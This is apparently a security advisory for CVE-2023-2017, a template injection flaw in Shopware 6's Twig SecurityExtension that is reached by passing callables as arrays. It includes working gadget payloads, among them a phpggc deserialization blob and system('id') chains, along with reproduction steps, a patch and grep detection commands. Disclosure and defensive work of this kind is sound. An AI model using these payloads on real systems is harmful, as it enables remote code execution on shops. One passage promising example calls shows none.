---
author: z0rs
title: Server Side Template Injection via Twig Security Extension
description: vulnerability allows a remote attacker who has access to a Twig environment to invoke any arbitrary PHP function and execute code or commands of their choice
date: 2023-04-15
---

### Overview:
Shopware is an e-commerce platform that is open source and built on the Symfony Framework and Vue.js. The default storefront of Shopware 6, called Shopware 6 Storefront, is based on Twig and Bootstrap. Users can customize the appearance of their storefront by using extensions (previously known as plugins) to override the default Twig template files. These custom themes can be enabled using the included Shopware 6 Administration panel.

Please note that this is a bypass of CVE-2023-22731, which is being tracked as issue [NEXT-24667](https://docs.shopware.com/en/shopware-6-en/security-updates/security-update-01-2023) by Shopware.

A vulnerability has been identified that allows bypassing the validation checks implemented by the `Shopware\Core\Framework\Adapter\Twig\SecurityExtension`. This extension is used to prevent the execution of arbitrary PHP functions through default filters in Twig, such as `map()`, `filter()`, `reduce()`, and `sort()`. The `SecurityExtension` was introduced in commit 89d1ea1 to address CVE-2023-22731. It overrides the aforementioned Twig filters (which are enabled by default) and ensures that the callable being executed is a permitted PHP function. However, there is a logic flaw in the validation process: the validation against the list of permitted functions is only performed if the argument passed to the filter is a string. By passing an array as a callable argument, the validation check can be bypassed.

As a result, this vulnerability allows a remote attacker who has access to a Twig environment to invoke any arbitrary PHP function and execute code or commands of their choice. This can be achieved by providing fully-qualified names as arrays of strings when referencing callables.

### Summary:

| Product                      | Shopware                 |
| ------------------------- | -------------------- |
| Vendor                      | Shopware AG           |
| Severity                      | High - Users with login access to Shopware Admin panel may be able to obtain remote code/command execution            |
| Affected Versions	                      | v6.4.18.1 <= v6.4.20.0, v6.5.0.0-rc1 <= v6.5.0.0-rc4 (Commit facfc88)              |
| Tested Versions                      | v6.4.20.0 (Latest stable version), v6.5.0.0-rc3 (Latest pre-release version)         | 
| CVE Identifier                     | CVE-2023-2017            | 
| CVE Description                      | Server-side Template Injection (SSTI) in Shopware 6 `(<= v6.4.20.0, v6.5.0.0-rc1 <= v6.5.0.0-rc4)`, affecting both shopware/core and shopware/platform GitHub repositories, allows remote attackers with access to a Twig environment without the Sandbox extension to bypass the validation checks in `Shopware\Core\Framework\Adapter\Twig\SecurityExtension` and call any arbitrary PHP function and thus execute arbitrary code/commands via usage of fully-qualified names, supplied as array of strings, when referencing callables. Users are advised to upgrade to v6.4.20.1 to resolve this issue. This is a bypass of CVE-2023-22731.                  |
| CWE Classification(s)                      | CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine           |
| CAPEC Classification(s)                      | CAPEC-242: Code Injection              |

This is a vulnerability summary for a Server-side Template Injection (SSTI) issue in Shopware 6, `versions v6.4.18.1 to v6.4.20.0 and v6.5.0.0-rc1 to v6.5.0.0-rc4 (Commit facfc88)`. The vulnerability, identified as CVE-2023-2017, allows remote attackers who have access to a Twig environment without the Sandbox extension to bypass validation checks and execute arbitrary code or commands by leveraging fully-qualified names supplied as an array of strings when referencing callables.

The affected software is Shopware, developed by Shopware AG. It is an e-commerce platform used for online shops. The severity of this vulnerability is rated as high, as it can be exploited by users with login access to the Shopware Admin panel.

The vulnerability falls under `CWE-184` (Incomplete List of Disallowed Inputs) and `CWE-1336` (Improper Neutralization of Special Elements Used in a Template Engine). Additionally, it is classified under CAPEC-242 (`Code Injection`), indicating that an attacker can inject malicious code into the system.

Users are advised to upgrade to version v6.4.20.1 to mitigate this issue. It is essential to apply this patch promptly to prevent unauthorized remote code/command execution and maintain the security of Shopware installations. This vulnerability represents a bypass of a previous issue, `CVE-2023-22731`.

Please note that this description is based on the provided information and may not include all the technical details of the vulnerability. It is recommended to refer to official sources, such as the CVE database or vendor advisories, for the most accurate and up-to-date information.

### CVSS3.1 Scoring System:

- Base Score: 8.8 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`


| Metric                      | Value                 |
| ------------------------- | -------------------- |
| Attack Vector (AV)                      | Network           |
| Attack Complexity (AC)                      | Low            |
| Privileges Required (PR)	                      | Low              |
| User Interaction (UI)                      | None         | 
| Scope (S)                      | Unchanged            | 
| Confidentiality (C)                      | High                  |
| Integrity (I)                      | High           |
| Availability (A)                      | High              |

These scores indicate that the vulnerability can be exploited over the network and does not require complex attack techniques. Additionally, low privileges are needed to exploit the vulnerability, and no user interaction is required. The scope remains unchanged, affecting the vulnerable component only. The impact of this vulnerability is rated as high in terms of confidentiality, integrity, and availability.

Please note that the CVSS3.1 scores are based on a standardized formula and provide a general assessment of the vulnerability's severity. For a more accurate evaluation, it is recommended to consider additional factors and perform a thorough security assessment.

### Vulnerability Details:

The vulnerability can be found in the SecurityExtension class declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php`:

```php
...
class SecurityExtension extends AbstractExtension
{
    ...

    /**
     * @return TwigFilter[]
     */
    public function getFilters(): array
    {
        return [
            new TwigFilter('map', [$this, 'map']),
            new TwigFilter('reduce', [$this, 'reduce']),
            new TwigFilter('filter', [$this, 'filter']),
            new TwigFilter('sort', [$this, 'sort']),
        ];
    }

    ...
    public function map(iterable $array, string|callable|\Closure $function): array
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [1]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value); // [2]
        }

        return $result;
    }

    ...
    public function reduce(iterable $array, string|callable|\Closure $function, mixed $initial = null): mixed
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [3]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        if (!\is_array($array)) {
            $array = iterator_to_array($array);
        }

        // @phpstan-ignore-next-line
        return array_reduce($array, $function, $initial); // [4]
    }

    ...
    public function filter(iterable $array, string|callable|\Closure $arrow): iterable
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [5]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }

        if (\is_array($array)) {
            // @phpstan-ignore-next-line
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // [6]
        }

        // @phpstan-ignore-next-line
        return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
    }

    ...
    public function sort(iterable $array, string|callable|\Closure|null $arrow = null): array
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [7]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }

        if ($array instanceof \Traversable) {
            $array = iterator_to_array($array);
        }

        if ($arrow !== null) {
            // @phpstan-ignore-next-line
            uasort($array, $arrow); //[8]
        } else {
            asort($array);
        }

        return $array;
    }
}
```
#### Explanation:

The vulnerability is found in the SecurityExtension class, which provides Twig filters and functions for manipulating arrays in Twig templates. However, there are some security issues present in this class.
1. In line [1], there is a condition that checks if `$function` is a string and whether its value is present in `$this->allowedPHPFunctions`. If `$function` is not a string listed in `$this->allowedPHPFunctions`, an exception is thrown. The problem is that if `$function` comes from an untrusted user input, this exception can be bypassed by including unsafe and dangerous functions.
2. In line [2], the `$function`, which is not specifically verified, is executed on each value in the `$array`. If `$function` comes from an untrusted user input, this can result in the execution of unsafe or dangerous code on each array element.
3. In line [3], there is a similar condition to line [1], where `$function` must be a string listed in `$this->allowedPHPFunctions`. If not, an exception is thrown. Similar issues apply here as described in line [1].
4. In line [4], the `$function`, which is not specifically verified, is used in `array_reduce` to reduce the array elements into a single value. If `$function` comes from an untrusted user input, this can result in the execution of unsafe or dangerous code.
5. In line [5], there is a similar condition to line [1] and [3], where `$arrow` must be a string listed in `$this->allowedPHPFunctions`. If not, an exception is thrown. Similar issues apply here as described in line [1].
6. In line [6], the `$arrow` function, which is not specifically verified, is used in `array_filter` to filter array elements based on the given criteria. If $arrow comes from an untrusted user input, this can result in the execution of unsafe or dangerous code.
7. In line [7], there is a similar condition to line [1], [3], and [5], where $arrow must be a string listed in `$this->allowedPHPFunctions`. If not, an exception is thrown. Similar issues apply here as described in line [1].
8. In line [8], the `$arrow` function, which is not specifically verified, is used in uasort to sort an associative array based on the value provided by the function. If $arrow comes from an untrusted user input, this can result in the execution of unsafe or dangerous code.

this vulnerability lies in the usage of functions and filters that are not specifically verified, allowing the possibility of utilizing unsafe or dangerous PHP functions if the values come from untrusted user input. This can lead to the execution of insecure or malicious code within applications that utilize this class. To address this vulnerability, proper validation and sanitization of the values received by these functions should be implemented, or alternative, more secure methods of manipulating data within Twig templates should be used.

A common mistake that developers make is assuming that the callable type refers to a string type. This is untrue, and it is well documented in the PHP Manual:

A method of an instantiated object is passed as an array containing an object at index 0 and the method name at index 1. Accessing protected and private methods from within a class is allowed. Static class methods can also be passed without instantiating an object of that class by either, passing the class name instead of an object at index 0, or passing ClassName::methodName.

This means that all of the following variable function calls are valid:

Going back to [1], if $arrow is an array instead of a string or closure, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Shopware’s codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:

#### Gadget 1: 
Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
Serialized payload generated using the phpggc tool: 
```bash
./phpggc -b Monolog/RCE8 system 'id'
```

Compressed payload is generated using:

```bash
$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
```

```
["\x78\x9C\x65\x90\x4D\x4F\xC3\x30\x0C\x86\x77\xE6\x67\xF8\xC8\xA9\x49\x61\x30\xE7\x86\x86\xE0\x50\x34\x09\xAE\x93\xA6\x7E\x78\xC5\x53\xDA\x4C\x49\x3A\xF1\xA1\xFE\x77\x92\x06\x8D\xA2\xDD\xEC\xF7\x8D\x5F\x3F\xCE\x06\xE5\x3D\xC2\x8B\xE9\x8D\x36\xED\xF6\xB9\xEC\x1B\x4D\x76\xFB\x64\xCD\x70\xFC\x6D\x00\x05\x7E\x3B\x14\x02\x61\x71\xBD\x78\x4F\xA2\x03\x55\x46\x9D\x31\x53\x1B\x94\xAB\xCB\x88\x87\x61\xBF\x27\x7B\xCE\x58\x4E\x19\xD9\x3C\x03\x94\xC5\x5C\x05\x35\x9F\xD4\x6A\x1A\x78\xE3\x2F\x02\xC5\x28\xA2\x71\x33\x33\x0A\xEE\xD8\x47\x27\x0B\xCE\x6A\x66\xFC\x23\x11\x77\x7F\x24\x85\x69\x5F\xA9\x36\xB6\x01\x94\x71\xFB\x2D\x82\xA6\x13\x69\x50\x8F\x28\x66\xC4\x45\x14\x71\x4D\xD5\xD0\x82\x9A\x9E\x75\xFC\x41\x4D\xAC\x25\x02\x87\x62\x1C\xCF\x30\xDC\xB3\xE7\x52\x07\xCA\xA0\x57\x09\x33\xF1\x1F\xAD\xA9\xC9\x39\x93\xFE\x26\x4F\x44\xC1\x0D\x79\x2D\xF9\x9D\xA9\x0E\x54\xFB\xDD\xA9\x8C\x7E\xBA\x2F\xCC\x51\xDF\xC4\x4E\x86\x6E\x89\xE0\x3E\x9D\xA7\x2E\xEE\x1B\xC7\xAB\x1F\x89\x25\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length
```

#### Gadget 2: 
Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Component\VarDumper\Vardumper::dump()` to invoke `system("id")`:

```
['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length
```

```
['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length
```

#### Gadget 3: 
Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke `proc_open("id > /tmp/pwned.txt")`:

```bash
{'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run())|length
```

### Exploit Conditions:
This vulnerability can be exploited if the attacker has access to:
- an administrator account, or
- a non-administrative user account with permissions to create/edit Twig templates, such as:
1. Settings > Email templates permissions
2. Content > Themes permissions
3. Additional Permissions > Manage Extensions permissions

### Steps Reproduction:
For simplicity, the following proof-of-concept uses the administrator account to demonstrate how the vulnerability can be exploited using `Email templates`.
1. Navigate to `http://<shopware_target>/admin#/sw/mail/template/index` and login to an administrator account.
2. Click the `...` button for the first template (e.g. `Cancellation invoice`), and click the Edit button.
3. Under the `Mail text` section, enter the following payload for the `HTML` text area:

#### Gadget 1: 
Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
Serialized payload generated using the phpggc tool: 

```bash
./phpggc -b Monolog/RCE8 system 'id'
```
Compressed payload is generated using: 

```bash
$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
```

```
["\x78\x9C\x65\x90\x4D\x4F\xC3\x30\x0C\x86\x77\xE6\x67\xF8\xC8\xA9\x49\x61\x30\xE7\x86\x86\xE0\x50\x34\x09\xAE\x93\xA6\x7E\x78\xC5\x53\xDA\x4C\x49\x3A\xF1\xA1\xFE\x77\x92\x06\x8D\xA2\xDD\xEC\xF7\x8D\x5F\x3F\xCE\x06\xE5\x3D\xC2\x8B\xE9\x8D\x36\xED\xF6\xB9\xEC\x1B\x4D\x76\xFB\x64\xCD\x70\xFC\x6D\x00\x05\x7E\x3B\x14\x02\x61\x71\xBD\x78\x4F\xA2\x03\x55\x46\x9D\x31\x53\x1B\x94\xAB\xCB\x88\x87\x61\xBF\x27\x7B\xCE\x58\x4E\x19\xD9\x3C\x03\x94\xC5\x5C\x05\x35\x9F\xD4\x6A\x1A\x78\xE3\x2F\x02\xC5\x28\xA2\x71\x33\x33\x0A\xEE\xD8\x47\x27\x0B\xCE\x6A\x66\xFC\x23\x11\x77\x7F\x24\x85\x69\x5F\xA9\x36\xB6\x01\x94\x71\xFB\x2D\x82\xA6\x13\x69\x50\x8F\x28\x66\xC4\x45\x14\x71\x4D\xD5\xD0\x82\x9A\x9E\x75\xFC\x41\x4D\xAC\x25\x02\x87\x62\x1C\xCF\x30\xDC\xB3\xE7\x52\x07\xCA\xA0\x57\x09\x33\xF1\x1F\xAD\xA9\xC9\x39\x93\xFE\x26\x4F\x44\xC1\x0D\x79\x2D\xF9\x9D\xA9\x0E\x54\xFB\xDD\xA9\x8C\x7E\xBA\x2F\xCC\x51\xDF\xC4\x4E\x86\x6E\x89\xE0\x3E\x9D\xA7\x2E\xEE\x1B\xC7\xAB\x1F\x89\x25\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length
```

4. In the right-sidebar, click the Show Preview button. Observe that the id shell command is executed successfully:
![img](https://starlabs.sg/advisories/23/images/CVE-2023-2017.png)

### Explanation of the Mitigations:

To address the vulnerability, a patch can be applied to the logic flaw in the `SecurityExtension` class declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php`. The patch ensures that the parameter passed to the respective filter functions must either be a `string` or a `Closure`. Here's an example patch for the `map()` filter:

```php
    public function map(iterable $array, string|callable|\Closure $function): array
    {
-       if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) {
+       if (!($function instanceof \Closure) && (!(\is_string($function) && \in_array($function, $this->allowedPHPFunctions, true))) {
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value);
        }

        return $result;
    }
```

The patch modifies the conditional check by first ensuring that `$function` is not an instance of `\Closure`. If it's not a closure, then it checks whether `$function` is a string and whether it is present in the `$this->allowedPHPFunctions` array. Only if either of these conditions is met, the code continues execution without throwing an exception.

This patch helps to mitigate the vulnerability by allowing only safe and allowed PHP functions or closures to be used within the filter functions. It prevents the execution of arbitrary and potentially malicious code passed through untrusted user input.

Similar patches should be applied to the `reduce()`, `filter()`, and `sort()` functions to ensure proper validation and restriction of the `$function` and `$arrow` parameters based on the required data types.

It's important to thoroughly test the patched code and ensure that the changes do not introduce any regressions or unintended consequences. Additionally, reviewing and addressing any other potential security vulnerabilities in the class and related code is recommended to ensure a robust and secure implementation.

#### Detection Guidance:
The following strategies may be used to detect potential exploitation attempts.
- Search within Twig cache/compiled Twig template files:
Use the following shell command to search for suspicious usage of `filter`, `map`, `reduce`, and `sort` functions within Twig cache/compiled Twig template files: 
```
grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' --exclude \*url_matching_routes.php /path/to/webroot/var/cache/
```
This command recursively searches within the `/path/to/webroot/var/cache/` directory for occurrences of the specified functions. It excludes the `url_matching_routes.php` file from the search.
- Search within custom apps/plugins/themes:
Use the following shell command to search for suspicious usage of `filter`, `map`, `reduce`, and `sort` functions within custom apps, plugins, or themes: 
```
grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' /path/to/webroot/custom/
```
This command recursively searches within the /path/to/webroot/custom/ directory for occurrences of the specified functions.

Note that it is not possible to detect indicators of compromise reliably using the Shopware log file (located at `/path/to/webroot/var/log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.

#### Conclusion:

The vulnerability described relates to the improper verification of Twig filter functions. It allows for the execution of unsafe or dangerous code if the parameters come from untrusted user input. This can result in unintended code execution or even the execution of malicious code.

To address this vulnerability, a logic fix needs to be implemented in the SecurityExtension class found in the `src/Core/Framework/Adapter/Twig/SecurityExtension.php` file. The suggested patch involves validating that the parameters passed to the filter functions are either a string or a secure Closure. The recommended fix includes using the instanceof operator to check if the parameter is an instance of a Closure and combining conditions `(\is_string() && \in_array())` to ensure that the passed string is an allowed function.

Additionally, detection guidelines have been provided to identify potential exploitation attempts. This involves searching within cached or compiled Twig template files and searching within custom apps, plugins, or themes that may use dangerous filter functions.

In practice, it is crucial to implement the recommended code fixes and regularly run detection strategies to identify potential exploitation attempts. Monitoring PHP logs and examining recorded errors or warnings can also help identify potential failed exploitation attempts.

By taking the appropriate remedial actions and implementing effective detection strategies, the risk of exploitation can be reduced, ensuring the security of systems using the vulnerable SecurityExtension class.
